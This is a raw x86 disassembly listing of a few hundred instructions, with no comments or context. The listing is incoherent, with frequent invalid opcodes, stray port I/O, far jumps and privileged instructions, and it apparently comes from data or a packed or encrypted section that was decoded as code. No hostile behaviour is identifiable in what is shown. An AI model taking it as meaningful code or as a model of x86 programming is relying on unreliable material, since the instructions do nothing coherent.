  40d559:	cs push cs
  40d55b:	jle    0x40d58f
  40d55d:	aad    0xf5
  40d55f:	jmp    0x40d564
  40d561:	dec    edi
  40d562:	push   0x24
  40d564:	xchg   esp,eax
  40d565:	inc    eax
  40d566:	and    BYTE PTR ds:0x43710656,0xe7
  40d56d:	(bad)  
  40d56e:	xor    al,0x8c
  40d570:	sahf   
  40d571:	and    bh,BYTE PTR [edi-0x139670a9]
  40d577:	hlt    
  40d578:	sub    ebx,DWORD PTR [ebp-0x28]
  40d57b:	lea    edx,[edx+0x2a2f6e13]
  40d581:	sub    al,0x16
  40d583:	inc    esi
  40d584:	push   edi
  40d585:	mov    eax,ds:0x6d21c392
  40d58a:	mov    al,ds:0xe7c953f8
  40d58f:	sub    ch,BYTE PTR ds:0x552cb3a0
  40d595:	sbb    eax,DWORD PTR [eax-0x5d]
  40d598:	in     al,0xe8
  40d59a:	cmp    DWORD PTR [edx+0x303fedd0],eax
  40d5a0:	jno    0x40d603
  40d5a2:	in     eax,0xf2
  40d5a4:	nop
  40d5a5:	push   ds
  40d5a6:	popf   
  40d5a7:	ss pop esi
  40d5a9:	repnz mov ebx,0x752cca7a
  40d5af:	push   esp
  40d5b0:	sub    cl,BYTE PTR [edx-0x43]
  40d5b3:	icebp  
  40d5b4:	fidiv  DWORD PTR [esi+0x4]
  40d5b7:	push   ds
  40d5b8:	clc    
  40d5b9:	cmp    WORD PTR [edx+0x2e],sp
  40d5bd:	out    dx,eax
  40d5be:	mov    DWORD PTR [edx+0x6d],ecx
  40d5c1:	jae    0x40d626
  40d5c3:	cld    
  40d5c4:	add    al,0xba
  40d5c6:	cmp    BYTE PTR [ebx+edi*2+0xc292262],bh
  40d5cd:	ins    DWORD PTR es:[edi],dx
  40d5ce:	inc    ebp
  40d5cf:	adc    esp,edi
  40d5d1:	fcmovnu st,st(1)
  40d5d4:	addr16 jge 0x40d5cf
  40d5d7:	cmc    
  40d5d8:	scas   eax,DWORD PTR es:[edi]
  40d5d9:	fist   DWORD PTR [ebx-0x6598af76]
  40d5df:	mov    dh,0xe2
  40d5e1:	in     eax,dx
  40d5e2:	fs gs leave 
  40d5e5:	and    eax,0xddfe24d3
  40d5ea:	data16 repnz add BYTE PTR [ecx+ecx*2-0x2a],bh
  40d5f0:	stc    
  40d5f1:	loopne 0x40d5a9
  40d5f3:	addr16 add al,0x89
  40d5f6:	rol    BYTE PTR [ecx+0x376e204f],cl
  40d5fc:	mov    ebp,0xca213c20
  40d601:	into   
  40d602:	xor    DWORD PTR [ebx],ecx
  40d604:	sbb    al,0xb6
  40d606:	or     BYTE PTR ds:0x5b7f413,ch
  40d60c:	and    ebx,DWORD PTR [ecx+0x36]
  40d60f:	int    0x37
  40d611:	addr16 (bad) 
  40d613:	inc    ecx
  40d614:	inc    esi
  40d616:	ret    
  40d617:	mov    DWORD PTR [ecx],0xf5fa82b4
  40d61d:	call   0x59b0d84
  40d622:	dec    esp
  40d623:	mov    DWORD PTR [edi],edi
  40d625:	pusha  
  40d626:	xor    DWORD PTR [esi],ecx
  40d628:	mov    ecx,0x71cf9ed7
  40d62d:	outs   dx,DWORD PTR ds:[esi]
  40d62e:	push   0x8150f7cf
  40d633:	popf   
  40d634:	pop    ecx
  40d635:	and    dh,ch
  40d637:	mov    dh,0x79
  40d639:	fs sbb al,0xcc
  40d63c:	push   0xffffffce
  40d63e:	xchg   edx,eax
  40d63f:	xor    BYTE PTR [ebx+eiz*8+0x76c0cb8e],ch
  40d646:	adc    bh,BYTE PTR [eax+0x5285c3f3]
  40d64c:	(bad)
  40d64f:	shl    BYTE PTR [eax-0x78640cb8],1
  40d655:	xor    esp,eax
  40d657:	not    DWORD PTR [esi+0x5f]
  40d65a:	fnclex 
  40d65c:	idiv   DWORD PTR [ecx]
  40d65e:	adc    BYTE PTR [ebp+eiz*1+0x7ae22bed],dh
  40d665:	jle    0x40d625
  40d667:	sti    
  40d668:	retf   0x55d5
  40d66b:	mov    ah,0xa
  40d66d:	sub    DWORD PTR [ecx],ebx
  40d66f:	loopne 0x40d617
  40d671:	ficomp DWORD PTR [esi-0x50abfdb9]
  40d677:	fistp  DWORD PTR [eax-0x67]
  40d67a:	ins    DWORD PTR es:[edi],dx
  40d67b:	in     al,0xaa
  40d67d:	push   eax
  40d67e:	jl     0x40d601
  40d680:	push   edx
  40d681:	cmc    
  40d682:	pop    ss
  40d683:	push   cs
  40d684:	addr16 ss int 0xf0
  40d688:	xchg   esi,eax
  40d689:	aam    0x52
  40d68b:	push   ss
  40d68c:	push   0x42
  40d68e:	addr16 push 0x606cd20b
  40d694:	fwait
  40d695:	cs cmp eax,0xe2505e4
  40d69b:	daa    
  40d69c:	ja     0x40d62d
  40d69e:	fs or  eax,0xd34aa25e
  40d6a4:	loope  0x40d631
  40d6a6:	jbe    0x40d6af
  40d6a8:	out    dx,al
  40d6a9:	idiv   DWORD PTR [esi-0x42]
  40d6ac:	(bad)  
  40d6ad:	stos   DWORD PTR es:[edi],eax
  40d6ae:	jbe    0x40d6f2
  40d6b0:	mov    DWORD PTR ds:0x5f68e917,ebx
  40d6b6:	xor    DWORD PTR [esi],ecx
  40d6b8:	inc    edx
  40d6b9:	xor    edi,DWORD PTR [eax]
  40d6bb:	arpl   WORD PTR [ecx],bx
  40d6bd:	jp     0x40d700
  40d6bf:	jno    0x40d6ff
  40d6c1:	xchg   edi,eax
  40d6c2:	jp     0x40d6d7
  40d6c4:	push   ds
  40d6c5:	mov    edi,esp
  40d6c7:	les    ecx,FWORD PTR [ebp+ebx*1-0x56]
  40d6cb:	mov    DWORD PTR [eax-0x68],esp
  40d6ce:	jae    0x40d6a7
  40d6d0:	inc    eax
  40d6d1:	(bad)  
  40d6d2:	cmp    DWORD PTR [eax-0x44],esp
  40d6d5:	sub    DWORD PTR [eax+ebx*4],ebx
  40d6d8:	int    0x85
  40d6da:	add    cl,bh
  40d6dc:	jle    0x40d72a
  40d6de:	and    eax,0x465b7f6a
  40d6e3:	pop    ds
  40d6e4:	mov    ds:0x4d225b6,al
  40d6e9:	jmp    0x7dcf:0x8397d211
  40d6f0:	out    dx,eax
  40d6f1:	xchg   esi,eax
  40d6f2:	outs   dx,DWORD PTR ds:[esi]
  40d6f3:	and    DWORD PTR [edi-0x50],esp
  40d6f6:	pop    es
  40d6f7:	cmp    bl,BYTE PTR [edx]
  40d6f9:	pop    edx
  40d6fa:	push   esp
  40d6fb:	gs (bad) 
  40d6fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6ff:	push   ebp
  40d700:	cmc    
  40d701:	sbb    eax,0x19d1f799
  40d706:	les    edi,FWORD PTR [ebp+0x2f11fedb]
  40d70c:	div    DWORD PTR [edi+0x18]
  40d70f:	push   edx
  40d710:	out    0xa2,eax
  40d712:	xchg   ebp,eax
  40d713:	jo     0x40d696
  40d715:	mov    ebp,DWORD PTR [ecx+0x58c3d5c9]
  40d71b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d71c:	mov    bl,BYTE PTR ds:0x8c552f38
  40d722:	outs   dx,BYTE PTR ds:[esi]
  40d723:	jae    0x40d76c
  40d725:	(bad)  
  40d726:	icebp  
  40d727:	xor    al,0x7b
  40d729:	push   ebx
  40d72a:	sbb    DWORD PTR [edi+0x7bdca1ff],eax
  40d730:	and    esp,ecx
  40d732:	dec    edi
  40d733:	scas   eax,DWORD PTR es:[edi]
  40d734:	call   0xa84a:0xf550a586
  40d73b:	cmc    
  40d73c:	(bad)
  40d741:	jo     0x40d7ac
  40d743:	add    edi,ebx
  40d745:	dec    esi
  40d746:	bound  ecx,QWORD PTR [edi]
  40d748:	jbe    0x40d768
  40d74a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d74b:	push   es
  40d74c:	and    ecx,esp
  40d74e:	or     DWORD PTR [ecx],ebp
  40d750:	dec    ecx
  40d751:	mov    ebp,0xa87916f4
  40d756:	retf   0xa569
  40d759:	and    ch,BYTE PTR [ebp-0x8831187]
  40d75f:	and    eax,0xfc5a99cc
  40d764:	add    DWORD PTR [eax+eax*1-0x3b6ca00f],edx
  40d76b:	fsub   DWORD PTR [esp+eax*2]
  40d76e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d76f:	lahf   
  40d770:	jecxz  0x40d71b
  40d772:	retf   
  40d773:	push   ds
  40d774:	int    0xe8
  40d776:	mov    dl,0x46
  40d778:	cmp    ch,BYTE PTR [eax+0x35dbdd1b]
  40d77e:	inc    edi
  40d77f:	and    al,0x29
  40d781:	test   al,0xb
  40d783:	(bad)  
  40d784:	aaa    
  40d785:	mov    ebx,0x235d6d74
  40d78a:	(bad)  
  40d78b:	fs fwait
  40d78d:	out    0x4e,eax
  40d78f:	push   esp
  40d790:	(bad)  
  40d791:	pop    edx
  40d792:	jg     0x40d7db
  40d794:	and    BYTE PTR [ebx+0x24],0xa7
  40d798:	(bad)  
  40d799:	leave  
  40d79a:	aas    
  40d79b:	xor    BYTE PTR [esi+0x3a4cd68f],ah
  40d7a1:	ffreep st(7)
  40d7a3:	std    
  40d7a4:	icebp  
  40d7a5:	mov    ecx,0x195618bd
  40d7aa:	or     al,0x85
  40d7ac:	push   ebx
  40d7ad:	sar    DWORD PTR [edi-0x27],0x75
  40d7b1:	out    dx,al
  40d7b2:	sub    BYTE PTR [edx],dh
  40d7b4:	adc    DWORD PTR [edx],edi
  40d7b6:	jecxz  0x40d73e
  40d7b8:	pop    es
  40d7b9:	dec    esp
  40d7ba:	mov    eax,ds:0x4cf6e74f
  40d7bf:	fimul  WORD PTR [ebp+0x24]
  40d7c2:	cmp    ecx,DWORD PTR [esi-0x2e280b5f]
  40d7c8:	shl    ecx,1
  40d7ca:	push   ss
  40d7cb:	push   ebx
  40d7cc:	adc    DWORD PTR [ecx+0x63d3008d],esp
  40d7d2:	pop    esp
  40d7d3:	or     BYTE PTR [eax],dl
  40d7d5:	jae    0x40d7e0
  40d7d7:	or     BYTE PTR [eax],ah
  40d7d9:	lea    esp,ds:0xb03c1e94
  40d7df:	bound  esp,QWORD PTR [ecx]
  40d7e1:	cmp    ebx,DWORD PTR [edi+0x44]
  40d7e4:	out    0x71,al
  40d7e6:	jge    0x40d78f
  40d7e8:	test   BYTE PTR fs:[edx+eax*2+0x74],bh
  40d7ed:	ja     0x40d784
  40d7ef:	inc    edx
  40d7f0:	sbb    bh,BYTE PTR [edi-0x13]
  40d7f3:	aaa    
  40d7f4:	push   esp
  40d7f5:	xor    dl,BYTE PTR [esi+edi*1+0x63f3245f]
  40d7fc:	popf   
  40d7fd:	adc    DWORD PTR [ebx+0xa75c556],eax
  40d803:	out    dx,eax
  40d804:	lahf   
  40d805:	and    eax,0x7b81c8e4
  40d80a:	push   fs
  40d80c:	pop    ecx
  40d80d:	or     eax,0xddef8834
  40d812:	test   eax,0x209e0452
  40d817:	and    al,0x69
  40d819:	mov    eax,0x2bfb3c14
  40d81e:	ret    
  40d81f:	(bad)  
  40d820:	aas    
  40d821:	repz jb 0x40d849
  40d824:	jmp    0x6621:0xe4a5b69f
  40d82b:	test   eax,0x26e491f4
  40d830:	pop    eax
  40d831:	in     eax,dx
  40d832:	pop    edx
  40d833:	cmp    BYTE PTR ds:0xd08156ef,bl
  40d839:	cld    
  40d83a:	push   esi
  40d83b:	mov    ah,0x30
  40d83d:	mov    cl,0x48
  40d83f:	jle    0x40d81c
  40d841:	lahf   
  40d842:	or     al,0x96
  40d844:	out    dx,eax
  40d845:	retf   0x50b6
  40d848:	pop    esp
  40d849:	and    eax,0x15f9ac43
  40d84e:	cwde   
  40d84f:	leave  
  40d850:	fwait
  40d851:	inc    edi
  40d852:	or     edi,edi
  40d854:	jae    0x40d7db
  40d856:	sahf   
  40d857:	popf   
  40d858:	out    0x9e,al
  40d85a:	out    0x7c,eax
  40d85c:	scas   eax,DWORD PTR es:[edi]
  40d85d:	sub    WORD PTR [edx+eiz*1],bx
  40d861:	sub    ch,0x77
  40d864:	out    0x89,al
  40d866:	inc    edx
  40d867:	mov    al,0x96
  40d869:	inc    eax
  40d86a:	inc    ebp
  40d86b:	dec    ebx
  40d86c:	in     al,dx
  40d86d:	sahf   
  40d86e:	test   DWORD PTR [ecx],esi
  40d870:	push   esp
  40d871:	and    BYTE PTR [edx+0x1],al
  40d874:	loop   0x40d8e3
  40d876:	xchg   edx,eax
  40d877:	jnp    0x40d88a
  40d879:	fild   QWORD PTR [esi]
  40d87b:	(bad)  
  40d87c:	sub    BYTE PTR [edx+eiz*1+0xd],al
  40d880:	adc    edi,esi
  40d882:	cmp    al,0xe9
  40d884:	mov    ch,0x96
  40d886:	mov    ch,0x2a
  40d888:	push   ebp
  40d889:	fpatan 
  40d88b:	sbb    edi,0x26
  40d88e:	or     ebx,DWORD PTR [ebx]
  40d890:	fsub   st,st(4)
  40d892:	cmp    al,0x70
  40d894:	jne    0x40d817
  40d896:	jl     0x40d8d0
  40d898:	out    dx,al
  40d899:	mov    ebx,0xf88728f9
  40d89e:	push   es
  40d89f:	or     DWORD PTR [ebx],esp
  40d8a1:	imul   ebx,DWORD PTR [eax],0xffffffa3
  40d8a4:	mov    bh,0xe3
  40d8a6:	pop    eax
  40d8a7:	sbb    al,0xbb
  40d8a9:	or     eax,0x2a81a914
  40d8ae:	xor    DWORD PTR [eax+ebx*4],edx
  40d8b1:	add    BYTE PTR [esi+0x281a813f],0xb0
  40d8b8:	cmp    DWORD PTR [ebx],edi
  40d8ba:	mov    al,ds:0x27ef8c3b
  40d8bf:	sbb    al,0x90
  40d8c1:	call   0xd1af:0x6d69eb76
  40d8c8:	push   ecx
  40d8c9:	jnp    0x40d8df
  40d8cb:	mov    cl,0x41
  40d8cd:	or     BYTE PTR [eax],bh
  40d8cf:	and    ebx,edi
  40d8d1:	(bad)
  40d8d4:	xchg   edx,eax
  40d8d5:	not    ecx
  40d8d7:	mov    ecx,0x22c58d60
  40d8dc:	adc    bl,BYTE PTR [ebp+0x1e065cb8]
  40d8e2:	test   eax,0x5b5b3974
  40d8e7:	push   0xffffffde
  40d8e9:	mov    dl,0x86
  40d8eb:	and    edx,0x1a750da6
  40d8f1:	arpl   WORD PTR [eax+edi*4+0x1c35a82e],sp
  40d8f8:	gs ret 
  40d8fa:	retf   
  40d8fb:	cmp    dl,BYTE PTR [ecx+0x39]
  40d8fe:	in     al,dx
  40d8ff:	pop    eax
  40d900:	inc    ecx
  40d901:	shl    DWORD PTR [eax+eiz*8+0x3fbb26f7],cl
  40d908:	ja     0x40d8e2
  40d90a:	push   edx
  40d90b:	leave  
  40d90c:	sbb    dh,BYTE PTR [ecx]
  40d90e:	les    esp,FWORD PTR [edi]
  40d910:	push   esi
  40d911:	cwde   
  40d912:	or     BYTE PTR [edx+0x49325ddd],dh
  40d918:	dec    ebp
  40d919:	retf   0x807f
  40d91c:	mov    al,0x7f
  40d91e:	jmp    0x273583d1
  40d923:	mov    al,0x98
  40d925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d926:	outs   dx,BYTE PTR ds:[esi]
  40d927:	and    DWORD PTR [ebx+0x219bf15],esi
  40d92d:	daa    
  40d92e:	arpl   di,si
  40d930:	stos   DWORD PTR es:[edi],eax
  40d931:	xor    BYTE PTR [ebx+0xb],bh
  40d934:	sbb    al,0x56
  40d936:	addr16 rcr ah,0xcd
  40d93a:	in     eax,0xbd
  40d93c:	dec    edi
  40d93d:	outs   dx,DWORD PTR ds:[esi]
  40d93e:	popf   
  40d93f:	jle    0x40d9af
  40d941:	loop   0x40d96d
  40d943:	xor    DWORD PTR [esi],edi
  40d945:	loopne 0x40d8dc
  40d947:	retf   0x82c0
  40d94a:	jbe    0x40d994
  40d94c:	or     edx,DWORD PTR [esi-0x67381a53]
  40d952:	add    al,0x97
  40d954:	push   ecx
  40d955:	int3   
  40d956:	xor    DWORD PTR [esi],ebx
  40d958:	dec    esp
  40d959:	pop    edx
  40d95a:	xor    BYTE PTR [esi+0x7e],0xa4
  40d95e:	dec    esi
  40d95f:	push   0x8a6c819f
  40d964:	dec    ebp
  40d965:	cld    
  40d966:	out    dx,al
  40d967:	pop    esp
  40d968:	ins    DWORD PTR es:[edi],dx
  40d969:	dec    edi
  40d96a:	sub    al,0x1f
  40d96c:	pop    ecx
  40d96d:	cmc    
  40d96e:	add    DWORD PTR [ecx-0x4263f09a],edx
  40d974:	(bad)  
  40d975:	int    0x67
  40d977:	lock in eax,0xee
  40d97a:	mov    eax,ds:0xbbdf66e6
  40d97f:	lahf   
  40d980:	ds aaa 
  40d982:	mov    BYTE PTR [eax+0x56],ah
  40d985:	loope  0x40d9bf
  40d987:	stc    
  40d988:	sub    al,0xba
  40d98a:	cmp    al,0xfa
  40d98c:	scas   eax,DWORD PTR es:[edi]
  40d98d:	ss mov bh,0xf1
  40d990:	sub    BYTE PTR [ebx],bh
  40d992:	mov    bh,0xda
  40d994:	xchg   BYTE PTR [ebp+0x5a],ah
  40d997:	add    al,0xcb
  40d999:	cmovno edx,esp
  40d99c:	cmp    eax,0x2fe076e8
  40d9a1:	je     0x40d92e
  40d9a3:	lea    ebp,[esi+0x1b]
  40d9a6:	and    BYTE PTR [ebx-0x786735b7],0x4e
  40d9ad:	out    0xda,eax
  40d9af:	jb     0x40da08
  40d9b1:	mov    al,ds:0x59c6e99b
  40d9b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9b7:	dec    edx
  40d9b8:	xor    eax,0x6c01cba7
  40d9bd:	add    eax,0x71a22fb2
  40d9c2:	xlat   BYTE PTR ds:[ebx]
  40d9c3:	repnz popa 
  40d9c5:	xor    dl,ch
  40d9c7:	nop
  40d9c8:	sub    al,0x7f
  40d9ca:	push   eax
  40d9cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9cc:	lods   al,BYTE PTR ds:[esi]
  40d9cd:	iret   
  40d9ce:	aaa    
  40d9cf:	inc    BYTE PTR [ebp-0x56]
  40d9d2:	or     BYTE PTR [edi-0x3e],dl
  40d9d5:	push   ecx
  40d9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9d7:	jns    0x40d97d
  40d9d9:	and    dh,bh
  40d9db:	adc    DWORD PTR [ebx],0x563c706
  40d9e1:	(bad)  
  40d9e5:	sbb    BYTE PTR [ebx],dh
  40d9e7:	mov    ebp,0x40bf38de
  40d9ec:	mov    esi,DWORD PTR [eax-0x40e4e034]
  40d9f2:	mov    ds:0xb080a6d,eax
  40d9f7:	cmp    edx,esp
  40d9f9:	xor    BYTE PTR [ebx],0xb4
  40d9fc:	sar    BYTE PTR [esi],0x70
  40d9ff:	gs dec edx
  40da01:	jnp    0x40da5f
  40da03:	int    0x9f
  40da05:	and    eax,0x64052abc
  40da0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da0c:	test   cl,bl
  40da0e:	jae    0x40da43
  40da10:	fstp   DWORD PTR ds:0x9f483c48
  40da16:	jmp    0x9b239945
  40da1b:	(bad)  
  40da1d:	iret   
  40da1e:	push   esp
  40da1f:	repnz dec edx
  40da21:	out    dx,al
  40da22:	sbb    BYTE PTR [eax],0xda
  40da25:	enter  0x9b46,0x74
  40da29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da2a:	xchg   edi,eax
  40da2b:	push   es
  40da2c:	sub    edi,DWORD PTR [edi-0x64]
  40da2f:	stc    
  40da30:	sub    dh,dh
  40da32:	ins    BYTE PTR es:[edi],dx
  40da33:	mov    esp,0x72f25369
  40da38:	jne    0x40d9d1
  40da3a:	cmp    al,0xee
  40da3c:	das    
  40da3d:	aad    0xa9
  40da3f:	jo     0x40da8c
  40da41:	loopne 0x40dab8
  40da43:	stos   DWORD PTR es:[edi],eax
  40da44:	jae    0x40d9f2
  40da46:	shl    BYTE PTR [ebx-0x7f],cl
  40da49:	xchg   DWORD PTR [esp],esp
  40da4c:	inc    ebx
  40da4d:	sahf   
  40da4e:	jae    0x40da4e
  40da50:	ja     0x40da45
  40da52:	(bad)
  40da55:	fild   QWORD PTR [ebx]
  40da57:	cmp    BYTE PTR [esi+0x71e0b4f7],bl
  40da5d:	clc    
  40da5e:	adc    al,0x7a
  40da60:	jne    0x40da0e
  40da62:	(bad)  
  40da63:	pushf  
  40da64:	aam    0xa1
  40da66:	int    0x4f
  40da68:	(bad)
  40da6b:	jb     0x40dab4
  40da6d:	les    ebx,FWORD PTR [edx+0x1a19e9e8]
  40da73:	mov    esi,ecx
  40da75:	ret    0x8b25
  40da78:	jae    0x40daee
  40da7a:	add    esi,esp
  40da7c:	imul   BYTE PTR [ebx-0x90da25]
  40da82:	aam    0xcd
  40da84:	push   edi
  40da85:	jmp    0x1bbd:0xd977f7e6
  40da8c:	add    DWORD PTR [edi],0xa
  40da8f:	jge    0x40da94
  40da91:	fidiv  WORD PTR [esi-0x79]
  40da94:	or     ecx,ebp
  40da96:	pop    eax
  40da97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da98:	pusha  
  40da99:	stc    
  40da9a:	dec    ebp
  40da9b:	xlat   BYTE PTR ds:[ebx]
  40da9c:	mov    ss,edi
  40da9e:	xor    BYTE PTR [edi-0x492b517a],0x73
  40daa5:	test   al,0x1
  40daa7:	shl    DWORD PTR [esi-0x2d],1
  40daaa:	push   ebp
  40daab:	inc    edx
  40daac:	push   ss
  40daad:	ret    
  40daae:	ja     0x40db15
  40dab0:	pusha  
  40dab1:	jmp    0x8b3be095
  40dab6:	adc    DWORD PTR [ecx],esp
  40dab8:	fsubr  st,st(6)
  40daba:	add    DWORD PTR [ebx-0x7e8e00b9],ecx
  40dac0:	jbe    0x40da65
  40dac2:	cmp    BYTE PTR [edx+ecx*4],0xd3
  40dac6:	sub    al,0x14
  40dac8:	outs   dx,DWORD PTR ds:[esi]
  40dac9:	push   eax
  40daca:	int3   
  40dacb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dacc:	(bad)  [ebp-0xde3d829]
  40dad2:	retf   
  40dad3:	out    0x4d,eax
  40dad5:	call   0x82df:0x9a5b4dbd
  40dadc:	stos   DWORD PTR es:[edi],eax
  40dadd:	mov    al,ds:0x99dffc39
  40dae2:	sbb    eax,0xe3f5d41d
  40dae7:	leave  
  40dae8:	hlt    
  40dae9:	mov    edx,0x166f5daa
  40daee:	sbb    al,0xe5
  40daf0:	neg    DWORD PTR [ebx-0x5b96c34a]
  40daf6:	inc    esi
  40daf7:	in     eax,dx
  40daf8:	and    eax,0x8539e0cc
  40dafd:	xchg   BYTE PTR [eax-0x6530506b],ch
  40db03:	js     0x40daeb
  40db05:	cmc    
  40db06:	es in  eax,dx
  40db08:	test   dh,bh
  40db0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db0b:	adc    BYTE PTR cs:[eax-0x65cd92ec],bl
  40db12:	fwait
  40db13:	mov    ebp,0x19f6dbd3
  40db18:	sbb    dl,ch
  40db1a:	das    
  40db1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db1c:	jmp    0xbdc0b067
  40db21:	cmp    eax,0xe76fea32
  40db26:	sbb    ah,BYTE PTR [ecx+0x30]
  40db29:	lds    ebx,FWORD PTR [edx-0x4b7601d]
  40db2f:	sbb    edi,DWORD PTR ds:0x2663aa71
  40db35:	xor    eax,0x54e4028b
  40db3a:	push   es
  40db3b:	scas   eax,DWORD PTR es:[edi]
  40db3c:	js     0x40db18
  40db3e:	adc    edi,DWORD PTR [edx-0x3762a76]
  40db44:	stc    
  40db45:	inc    esi
  40db46:	xlat   BYTE PTR ds:[ebx]
  40db47:	rcr    DWORD PTR [edx-0x5f7f00f],cl
  40db4d:	lods   al,BYTE PTR ds:[esi]
  40db4e:	nop
  40db4f:	or     al,0xc5
  40db51:	retf   
  40db52:	fidivr WORD PTR [ebx+0x65258a86]
  40db58:	ss ss xchg edx,eax
  40db5b:	push   esp
  40db5c:	fld    QWORD PTR [eax+ebx*2+0x31]
  40db60:	je     0x40dbc0
  40db62:	or     al,0x3f
  40db64:	out    0xcf,eax
  40db66:	(bad)  
  40db67:	dec    esp
  40db68:	mov    ds:0xf26325d,eax
  40db6d:	aas    
  40db6e:	dec    edi
  40db6f:	sbb    ecx,DWORD PTR [ebx+0x60329460]
  40db75:	lds    edx,FWORD PTR [ebp+0x37dfb56f]
  40db7b:	data16 lahf 
  40db7d:	add    DWORD PTR [eax+0x35],ecx
  40db80:	imul   esi,DWORD PTR [esi-0x5f995795],0xf32fa1b6
  40db8a:	in     al,0xfb
  40db8c:	push   ebp
  40db8d:	jecxz  0x40db93
  40db8f:	pushf  
  40db90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db91:	scas   al,BYTE PTR es:[edi]
  40db92:	jle    0x40dbd4
  40db94:	fs pandn mm3,mm7
  40db98:	dec    ecx
  40db99:	fdivr  st,st(4)
  40db9b:	dec    edx
  40db9c:	inc    edx
  40db9d:	call   0x74790a37
  40dba2:	mov    ecx,0x82793dc
  40dba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dba8:	push   ebp
  40dba9:	fwait
  40dbaa:	leave  
  40dbab:	in     al,0xa3
  40dbad:	lea    esp,[edi+0xd47ff7f]
  40dbb3:	fnstenv [esi+0x69d621ea]
  40dbb9:	daa    
  40dbba:	sbb    dh,BYTE PTR [eax+0x39]
  40dbbd:	jp     0x40dbda
  40dbbf:	cmp    eax,0x1717f780
  40dbc4:	repz pop ss
  40dbc6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40dbc8:	lahf   
  40dbc9:	cld    
  40dbca:	jge    0x40dbf6
  40dbcc:	xchg   BYTE PTR [ebx+0x4e],cl
  40dbcf:	mov    eax,ebx
  40dbd1:	jbe    0x40dc0d
  40dbd3:	adc    al,0x23
  40dbd5:	test   BYTE PTR [ecx+0x18fc4d43],ah
  40dbdb:	dec    edx
  40dbdc:	mov    WORD PTR [edi-0x11],gs
  40dbdf:	and    eax,DWORD PTR [ebp-0xe]
  40dbe2:	xchg   esp,eax
  40dbe3:	test   eax,0x5ec117a6
  40dbe8:	or     ebx,DWORD PTR [edi-0x11933237]
  40dbee:	imul   esi,esi,0xffffffd7
  40dbf1:	add    BYTE PTR [ecx],bl
  40dbf3:	inc    ebx
  40dbf4:	jne    0x40dc21
  40dbf6:	das    
  40dbf7:	cmp    eax,0x13267a58
  40dbfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbfd:	mov    ds:0x1e15f1b5,al
  40dc02:	push   0x22
  40dc04:	fistp  DWORD PTR [edx+0x7efad86e]
  40dc0a:	(bad)  
  40dc0b:	leave  
  40dc0c:	jecxz  0x40dc01
  40dc0e:	inc    ecx
  40dc0f:	cli    
  40dc10:	push   edx
  40dc11:	xchg   esi,eax
  40dc12:	mov    esp,0xe7009eb4
  40dc17:	test   BYTE PTR [esp+edx*8],ch
  40dc1a:	addr16 push esp
  40dc1c:	adc    esp,edx
  40dc1e:	scas   al,BYTE PTR es:[edi]
  40dc1f:	das    
  40dc20:	loop   0x40dc73
  40dc22:	test   eax,0x801acbe1
  40dc27:	xchg   esp,eax
  40dc28:	sahf   
  40dc29:	xchg   esi,eax
  40dc2a:	cmp    ebp,edi
  40dc2c:	cmc    
  40dc2d:	ss scas eax,DWORD PTR es:[edi]
  40dc2f:	clc    
  40dc30:	aas    
  40dc31:	mov    edi,0x399171e3
  40dc36:	not    BYTE PTR [edi]
  40dc38:	js     0x40dc34
  40dc3a:	xchg   ebx,eax
  40dc3b:	aas    
  40dc3c:	xor    edx,DWORD PTR [ebp-0x2909035c]
  40dc42:	out    dx,eax
  40dc43:	adc    al,0xeb
  40dc45:	mov    ebx,0x96cc369c
  40dc4a:	into   
  40dc4b:	and    al,0xc3
  40dc4d:	cmp    al,0x67
  40dc4f:	xchg   DWORD PTR [edx+0x469acc11],esp
  40dc55:	loope  0x40dc64
  40dc57:	call   0x55e1:0x15af1ec1
  40dc5e:	test   eax,0x81f8f87
  40dc63:	pusha  
  40dc64:	ds call 0x1ce:0x7c575ee2
  40dc6c:	sub    dl,BYTE PTR [ebx]
  40dc6e:	xchg   ebx,eax
  40dc6f:	add    ah,al
  40dc71:	jp     0x40dca5
  40dc73:	mov    ds:0x677e505b,eax
  40dc78:	lods   eax,DWORD PTR ds:[esi]
  40dc79:	ret    0xcbc4
  40dc7c:	sub    BYTE PTR [eax+0x2f1f4588],ah
  40dc82:	test   esp,ecx
  40dc84:	scas   al,BYTE PTR es:[edi]
  40dc85:	pop    es
  40dc86:	sub    dh,bh
  40dc88:	dec    eax
  40dc89:	dec    ecx
  40dc8a:	bound  esp,QWORD PTR [eax-0x47]
  40dc8d:	mov    esi,0x856fa106
  40dc92:	test   DWORD PTR [edi],esp
  40dc94:	and    eax,ebx
  40dc96:	xchg   BYTE PTR [edx+0x4d],ah
  40dc99:	in     eax,0xa9
  40dc9b:	jne    0x40dc7d
  40dc9d:	imul   edi,DWORD PTR [eax],0xffffff9a
  40dca0:	fs pop esp
  40dca2:	arpl   WORD PTR gs:[eax-0x5028a395],sp
  40dca9:	or     DWORD PTR [edi+0x4f0f14ad],esi
  40dcaf:	(bad)  
  40dcb0:	retf   0x3134
  40dcb3:	data16 mov ch,0xfb
  40dcb6:	vmwrite edx,DWORD PTR [ecx+0x4f]
  40dcba:	adc    cl,BYTE PTR [ecx-0x7a56ff14]
  40dcc0:	jg     0x40dcd5
  40dcc2:	jmp    FWORD PTR [ecx+eax*1]
  40dcc5:	test   al,0x13
  40dcc7:	aam    0x9c
  40dcc9:	test   ebp,0x6698bac2
  40dccf:	sub    esp,ebp
  40dcd1:	mov    ds:0xd7df903f,eax
